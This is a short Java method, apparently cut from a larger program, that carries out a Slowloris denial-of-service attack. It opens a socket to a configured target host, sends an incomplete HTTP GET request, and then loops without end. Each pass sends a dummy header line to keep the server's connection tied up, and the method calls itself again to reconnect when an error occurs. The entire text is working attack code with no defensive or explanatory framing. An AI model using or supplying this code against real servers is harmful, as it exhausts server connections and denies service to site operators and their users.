private void sendSlowLorisRequest() throws Exception
{
    Socket socket = new Socket(InetAddress.getByName(HOST),PORT);
    BufferedWriter wr = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream(),"UTF8"));
    wr.write("GET " + PATH + " HTTP/1.0" + "\r\n");
    wr.flush();

    while(true)
    {
        try
        {
            Thread.sleep(SLEEP_TIME);
            wr.write("some_header: " + "some_value" + "\r\n");
            wr.flush();
            System.out.println("Send some data from thread: " + Thread.currentThread().getName());
        }
        catch (Exception e)
        {
            System.out.println(e.getMessage());
            System.out.println("Something went wrong, Reinitializing the socket and sending the request again");
            sendSlowLorisRequest();
        }
    }
}